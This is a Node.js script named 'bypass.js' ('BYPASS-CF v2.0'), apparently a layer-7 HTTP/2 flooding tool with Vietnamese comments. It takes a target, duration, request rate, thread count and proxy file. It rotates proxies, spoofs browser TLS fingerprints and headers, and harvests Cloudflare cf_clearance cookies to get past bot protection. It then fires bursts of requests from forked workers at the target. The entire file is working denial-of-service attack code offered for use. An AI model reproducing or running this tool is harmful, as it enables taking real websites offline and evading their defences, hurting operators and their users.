const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const http = require("http");
const colors = require("colors");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/jxl,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/heic,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
];

const cache_header = [
    'max-age=0',
    'no-cache',
    'no-store',
    'must-revalidate',
    'proxy-revalidate'
];

const language_header = [
    'en-US,en;q=0.9',
    'fr-FR,fr;q=0.8,en;q=0.7',
    'de-DE,de;q=0.9,en;q=0.8',
    'zh-CN,zh;q=0.9,en;q=0.8',
    'es-ES,es;q=0.9,en;q=0.8',
    'ja-JP,ja;q=0.9,en;q=0.8',
    'it-IT,it;q=0.9,en;q=0.8'
];

const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"];

const cplist = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
];

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "ecdsa_secp521r1_sha512",
    "rsa_pss_rsae_sha512"
];

const browsers = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.2651.74`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36`
];

const client_hints = [
    { "sec-ch-ua": `"Not/A)Brand";v="99", "Google Chrome";v="126", "Chromium";v="126"`, "sec-ch-ua-platform": `"Windows"`, "sec-ch-ua-mobile": "?0", "sec-ch-ua-full-version-list": `"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="126.0.6478.127", "Chromium";v="126.0.6478.127"` },
    { "sec-ch-ua": `"Not/A)Brand";v="99", "Mozilla";v="128", "Firefox";v="128"`, "sec-ch-ua-platform": `"Windows"`, "sec-ch-ua-mobile": "?0", "sec-ch-ua-full-version-list": `"Not/A)Brand";v="99.0.0.0", "Mozilla";v="128.0.3", "Firefox";v="128.0.3"` },
    { "sec-ch-ua": `"Not/A)Brand";v="99", "Safari";v="17", "AppleWebKit";v="605"`, "sec-ch-ua-platform": `"macOS"`, "sec-ch-ua-mobile": "?0", "sec-ch-ua-full-version-list": `"Not/A)Brand";v="99.0.0.0", "Safari";v="17.0", "AppleWebKit";v="605.1.15"` },
    { "sec-ch-ua": `"Not/A)Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"`, "sec-ch-ua-platform": `"Windows"`, "sec-ch-ua-mobile": "?0", "sec-ch-ua-full-version-list": `"Not/A)Brand";v="99.0.0.0", "Microsoft Edge";v="127.0.2651.74", "Chromium";v="127.0.2651.74"` }
];

const sub_paths = [
    "/static/css/main.css",
    "/static/js/main.js",
    "/images/logo.png",
    "/favicon.ico",
    "/api/status",
    "/assets/style.css",
    "/scripts/app.js",
    "/resources/font.woff",
    "/images/background.jpg"
];

const SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:P-256:P-384:P-521";
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_3 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

if (process.argv.length < 7) {
    console.log(`Usage: node bypass.js <host> <time> <req_rate> <threads> <proxy_file>`.red);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
let proxies = [];
let sessionCookies = {};
let failedAttempts = 0;
let successfulRequests = 0;
let failedRequests = 0;
const MAX_FAILED_ATTEMPTS = 5;
const PROXY_ROTATE_INTERVAL = 30000; // 30 giây
const PROXY_ROTATE_REQUESTS = 100; // Xoay proxy sau 100 yêu cầu
const startTime = Date.now();

// Hàm hiển thị logo ASCII và trạng thái
function displayLogoAndStatus() {
    console.clear();
    const logo = `
${'╔'.cyan}${'═'.repeat(50).cyan}${'╗'.cyan}
${'║'.cyan} ${'BYPASS-CF v2.0'.bold.green} ${' '.repeat(35).cyan}${'║'.cyan}
${'║'.cyan} Target: ${parsedTarget.href.slice(0, 40).cyan}${parsedTarget.href.length > 40 ? '...' : ''}
${'║'.cyan} Threads: ${args.threads.toString().cyan}
${'║'.cyan} Proxies: ${proxies.length.toString().cyan}
${'║'.cyan} Time Running: ${Math.floor((Date.now() - startTime) / 1000).toString().cyan} seconds
${'║'.cyan} Successful Requests: ${successfulRequests.toString().green}
${'║'.cyan} Failed Requests: ${failedRequests.toString().red}
${'║'.cyan} Cookie Status: ${sessionCookies[parsedTarget.host] ? 'Active'.green : 'Inactive'.red}
${'╚'.cyan}${'═'.repeat(50).cyan}${'╝'.cyan}
    `.trim();
    console.log(logo);
}

async function loadValidProxies(filePath) {
    const proxyList = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
    const validProxies = [];
    for (const proxy of proxyList) {
        if (await checkProxy(proxy)) {
            validProxies.push(proxy);
            console.log(`[>] Valid proxy: ${proxy}`.cyan);
        }
    }
    return validProxies;
}

async function checkProxy(proxy) {
    return new Promise((resolve) => {
        const [host, port] = proxy.split(":");
        const conn = net.connect({ host, port, timeout: 5000 });
        conn.on("connect", () => {
            conn.destroy();
            resolve(true);
        });
        conn.on("error", () => resolve(false));
        conn.on("timeout", () => {
            conn.destroy();
            resolve(false);
        });
    });
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
}

async function getClearanceCookie(proxyAddr, targetUrl, tlsOptions) {
    return new Promise((resolve, reject) => {
        const parsedProxy = proxyAddr.split(":");
        const proxyOptions = {
            host: parsedProxy[0],
            port: ~~parsedProxy[1],
            address: parsedTarget.host + ":443",
            timeout: 5
        };

        const Socker = new NetSocket();
        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error) return reject(error);

            connection.setKeepAlive(true, 600000);
            connection.setNoDelay(true);

            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
            tlsConn.setNoDelay(true);
            tlsConn.setKeepAlive(true, 600000);
            tlsConn.setMaxListeners(0);

            const client = http2.connect(targetUrl, {
                settings: {
                    headerTableSize: 65536,
                    maxHeaderListSize: 32768,
                    initialWindowSize: 15564991,
                    maxFrameSize: 16384
                },
                createConnection: () => tlsConn
            });

            client.setMaxListeners(0);

            const selectedHints = client_hints[Math.floor(Math.random() * client_hints.length)];
            const headers = {
                ":method": "GET",
                ":authority": parsedTarget.host,
                ":scheme": "https",
                ":path": parsedTarget.path,
                "user-agent": browsers[Math.floor(Math.random() * browsers.length)],
                "accept": accept_header[Math.floor(Math.random() * accept_header.length)],
                "accept-encoding": "gzip, deflate, br",
                "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
                "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
                "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
                "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
                "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
                ...selectedHints
            };

            const request = client.request(headers);
            let responseBody = "";
            request.on('data', chunk => {
                responseBody += chunk;
            });
            request.on('response', (response) => {
                let cfClearance = "";
                if (response["set-cookie"]) {
                    const cookies = Array.isArray(response["set-cookie"]) ? response["set-cookie"] : [response["set-cookie"]];
                    for (const cookie of cookies) {
                        if (cookie.includes("cf_clearance")) {
                            cfClearance = cookie.split(';')[0];
                            break;
                        }
                    }
                }
                if (response[":status"] === 403 || response[":status"] === 429) {
                    request.close();
                    request.destroy();
                    client.destroy();
                    tlsConn.destroy();
                    connection.destroy();
                    reject(`Received ${response[":status"]}, retrying with new proxy...`);
                } else {
                    if (responseBody.includes("cf_clearance")) {
                        const match = responseBody.match(/cf_clearance=([^;]+)/);
                        if (match) cfClearance = `cf_clearance=${match[1]}`;
                    }
                    request.close();
                    request.destroy();
                    client.destroy();
                    tlsConn.destroy();
                    connection.destroy();
                    resolve(cfClearance);
                }
            });

            request.on('error', () => {
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
                reject("Failed to get cookie");
            });

            request.end();
        });
    });
}

async function sendSubResourceRequest(proxyAddr, path, tlsOptions) {
    return new Promise((resolve) => {
        const parsedProxy = proxyAddr.split(":");
        const proxyOptions = {
            host: parsedProxy[0],
            port: ~~parsedProxy[1],
            address: parsedTarget.host + ":443",
            timeout: 5
        };

        const Socker = new NetSocket();
        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error) return resolve();

            connection.setKeepAlive(true, 600000);
            connection.setNoDelay(true);

            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
            tlsConn.setNoDelay(true);
            tlsConn.setKeepAlive(true, 600000);
            tlsConn.setMaxListeners(0);

            const client = http2.connect(parsedTarget.href, {
                settings: {
                    headerTableSize: 65536,
                    maxHeaderListSize: 32768,
                    initialWindowSize: 15564991,
                    maxFrameSize: 16384
                },
                createConnection: () => tlsConn
            });

            client.setMaxListeners(0);

            const selectedHints = client_hints[Math.floor(Math.random() * client_hints.length)];
            const headers = {
                ":method": "GET",
                ":authority": parsedTarget.host,
                ":scheme": "https",
                ":path": path,
                "user-agent": browsers[Math.floor(Math.random() * browsers.length)],
                "accept": accept_header[Math.floor(Math.random() * accept_header.length)],
                "accept-encoding": "gzip, deflate, br",
                "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
                "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "no-cors",
                "sec-fetch-dest": path.includes(".css") ? "style" : path.includes(".js") ? "script" : path.includes(".woff") ? "font" : "image",
                ...selectedHints,
                "cookie": sessionCookies[parsedTarget.host] || ""
            };

            const request = client.request(headers);
            request.on('response', () => {
                request.close();
                request.destroy();
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
                resolve();
            });
            request.on('error', () => {
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
                resolve();
            });
            request.end();
        });
    });
}

const MAX_RAM_PERCENTAGE = 99;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
    console.clear();
    loadValidProxies(args.proxyFile).then(validProxies => {
        proxies = validProxies;
        if (proxies.length === 0) {
            console.log("No valid proxies found!".red);
            process.exit();
        }

        displayLogoAndStatus();

        const restartScript = () => {
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
            console.log('[>] Restarting the script in'.cyan, RESTART_DELAY, 'ms...'.cyan);
            setTimeout(() => {
                for (let counter = 1; counter <= args.threads; counter++) {
                    cluster.fork();
                }
            }, RESTART_DELAY);
        };

        const handleRAMUsage = () => {
            const totalRAM = os.totalmem();
            const usedRAM = totalRAM - os.freemem();
            const ramPercentage = (usedRAM / totalRAM) * 100;
            if (ramPercentage >= MAX_RAM_PERCENTAGE) {
                console.log('[!] Maximum RAM usage:'.red, ramPercentage.toFixed(2), '%'.red);
                restartScript();
            }
        };

        setInterval(() => {
            displayLogoAndStatus();
        }, 10000); // Cập nhật logo và trạng thái mỗi 10 giây

        setInterval(handleRAMUsage, 5000);

        for (let counter = 1; counter <= args.threads; counter++) {
            cluster.fork();
        }
    });
} else {
    setInterval(runFlooder, 1000);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", () => {
            connection.destroy();
            return callback(undefined, "error: connection failed");
        });
    }
}

const Socker = new NetSocket();

async function runFlooder() {
    if (proxies.length === 0) {
        console.log("[!] No valid proxies available, stopping...".red);
        return;
    }

    let proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
    let requestCount = 0;
    let lastProxyRotate = Date.now();

    if (Date.now() - lastProxyRotate > PROXY_ROTATE_INTERVAL || requestCount >= PROXY_ROTATE_REQUESTS) {
        proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
        requestCount = 0;
        lastProxyRotate = Date.now();
        console.log(`[>] Rotated proxy to ${proxyAddr}`.cyan);
    }

    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";

    const tlsOptions = {
        port: parsedPort,
        secure: true,
        ALPNProtocols: ["h2", "http/1.1"],
        ciphers: cplist[Math.floor(Math.random() * cplist.length)],
        sigalgs: SignalsList,
        requestCert: true,
        ecdhCurve: ecdhCurve,
        honorCipherOrder: false,
        rejectUnauthorized: false,
        secureOptions: secureOptions,
        secureContext: secureContext,
        host: parsedTarget.host,
        servername: parsedTarget.host,
        secureProtocol: secureProtocol
    };

    if (!sessionCookies[parsedTarget.host] || failedAttempts >= MAX_FAILED_ATTEMPTS) {
        try {
            const cfClearance = await getClearanceCookie(proxyAddr, parsedTarget.href, tlsOptions);
            if (cfClearance) {
                sessionCookies[parsedTarget.host] = cfClearance;
                console.log(`[>] Got cf_clearance cookie: ${cfClearance}`.green);
                failedAttempts = 0;
            } else {
                failedAttempts++;
                console.log(`[!] No cf_clearance cookie received, retrying... (${failedAttempts}/${MAX_FAILED_ATTEMPTS})`.yellow);
                return;
            }
        } catch (error) {
            failedAttempts++;
            console.log(`[!] Failed to get cf_clearance cookie: ${error} (${failedAttempts}/${MAX_FAILED_ATTEMPTS})`.red);
            if (failedAttempts >= MAX_FAILED_ATTEMPTS) {
                console.log("[!] Too many failed attempts, refreshing proxies...".red);
                proxies = await loadValidProxies(args.proxyFile);
                failedAttempts = 0;
            }
            return;
        }
    }

    const selectedHints = client_hints[Math.floor(Math.random() * client_hints.length)];
    const selectedPath = Math.random() < 0.3 ? sub_paths[Math.floor(Math.random() * sub_paths.length)] : parsedTarget.path + "?" + randstr(3) + "=" + generateRandomString(10, 25);
    const orderedHeaders = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": selectedPath,
        "user-agent": browsers[Math.floor(Math.random() * browsers.length)],
        "accept": accept_header[Math.floor(Math.random() * accept_header.length)],
        "accept-encoding": "gzip, deflate, br",
        "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
        "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
        "sec-fetch-site": selectedPath === parsedTarget.path ? fetch_site[Math.floor(Math.random() * fetch_site.length)] : "same-origin",
        "sec-fetch-mode": selectedPath === parsedTarget.path ? fetch_mode[Math.floor(Math.random() * fetch_mode.length)] : "no-cors",
        "sec-fetch-dest": selectedPath.includes(".css") ? "style" : selectedPath.includes(".js") ? "script" : selectedPath.includes(".woff") ? "font" : selectedPath.includes(".png") || selectedPath.includes(".ico") || selectedPath.includes(".jpg") ? "image" : fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
        ...selectedHints,
        "cookie": sessionCookies[parsedTarget.host] || "",
        "referer": parsedTarget.href
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 5
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            console.log(`[!] Proxy error: ${error}`.red);
            failedRequests++;
            return;
        }

        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        let useHttp2 = true;
        if (Math.random() < 0.1) {
            useHttp2 = false;
            const req = http.request({
                host: parsedProxy[0],
                port: parsedProxy[1],
                method: "CONNECT",
                path: `${parsedTarget.host}:443`
            });
            req.on('connect', (res, socket) => {
                if (res.statusCode !== 200) {
                    socket.destroy();
                    failedRequests++;
                    return;
                }
                const tlsConn = tls.connect({ ...tlsOptions, socket }, () => {
                    const httpReq = http.request({
                        host: parsedTarget.host,
                        port: 443,
                        path: selectedPath,
                        method: "GET",
                        headers: orderedHeaders,
                        createConnection: () => tlsConn
                    });
                    httpReq.on('response', (res) => {
                        if (res.statusCode === 403 || res.statusCode === 429) {
                            console.log(`[!] HTTP/1.1 Received ${res.statusCode}, switching proxy and refreshing cookie...`.red);
                            failedAttempts++;
                            failedRequests++;
                            socket.destroy();
                            tlsConn.destroy();
                            delete sessionCookies[parsedTarget.host];
                            runFlooder();
                        } else {
                            successfulRequests++;
                            if (res.headers["set-cookie"]) {
                                const cookies = Array.isArray(res.headers["set-cookie"]) ? res.headers["set-cookie"] : [res.headers["set-cookie"]];
                                for (const cookie of cookies) {
                                    if (cookie.includes("cf_clearance")) {
                                        sessionCookies[parsedTarget.host] = cookie.split(';')[0];
                                        console.log(`[>] Updated cf_clearance cookie: ${sessionCookies[parsedTarget.host]}`.green);
                                        failedAttempts = 0;
                                    }
                                }
                            }
                            socket.destroy();
                            tlsConn.destroy();
                        }
                    });
                    httpReq.on('error', () => {
                        socket.destroy();
                        tlsConn.destroy();
                        failedRequests++;
                    });
                    httpReq.end();
                });
            });
            req.on('error', () => {
                socket.destroy();
                failedRequests++;
            });
            req.end();
            return;
        }

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 600000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            settings: {
                headerTableSize: 65536,
                maxHeaderListSize: 32768,
                initialWindowSize: 15564991,
                maxFrameSize: 16384
            },
            createConnection: () => tlsConn
        });

        client.setMaxListeners(0);
        client.settings({
            headerTableSize: 1048576,
            maxHeaderListSize: 1048576,
            initialWindowSize: 2147483647,
            maxFrameSize: 65536
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    setTimeout(() => {
                        const request = client.request({ ...orderedHeaders }, {
                            parent: 0,
                            exclusive: true,
                            weight: 220
                        });
                        request.on('response', (response) => {
                            if (response[":status"] === 403 || response[":status"] === 429) {
                                console.log(`[!] Received ${response[":status"]}, switching proxy and refreshing cookie...`.red);
                                failedAttempts++;
                                failedRequests++;
                                client.destroy();
                                tlsConn.destroy();
                                connection.destroy();
                                delete sessionCookies[parsedTarget.host];
                                runFlooder();
                            } else {
                                successfulRequests++;
                                if (response["set-cookie"]) {
                                    const cookies = Array.isArray(response["set-cookie"]) ? response["set-cookie"] : [response["set-cookie"]];
                                    for (const cookie of cookies) {
                                        if (cookie.includes("cf_clearance")) {
                                            sessionCookies[parsedTarget.host] = cookie.split(';')[0];
                                            console.log(`[>] Updated cf_clearance cookie: ${sessionCookies[parsedTarget.host]}`.green);
                                            failedAttempts = 0;
                                        }
                                    }
                                }
                                request.close();
                                request.destroy();
                            }
                        });
                        request.on('error', () => {
                            client.destroy();
                            tlsConn.destroy();
                            connection.destroy();
                            failedRequests++;
                        });
                        request.end();
                        requestCount++;
                    }, Math.random() * 200);
                }
                if (Math.random() < 0.3) {
                    const subPath = sub_paths[Math.floor(Math.random() * sub_paths.length)];
                    sendSubResourceRequest(proxyAddr, subPath, tlsOptions);
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });

        client.on("timeout", () => {
            client.destroy();
            connection.destroy();
            failedRequests++;
        });

        client.on("error", () => {
            client.destroy();
            connection.destroy();
            failedRequests++;
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});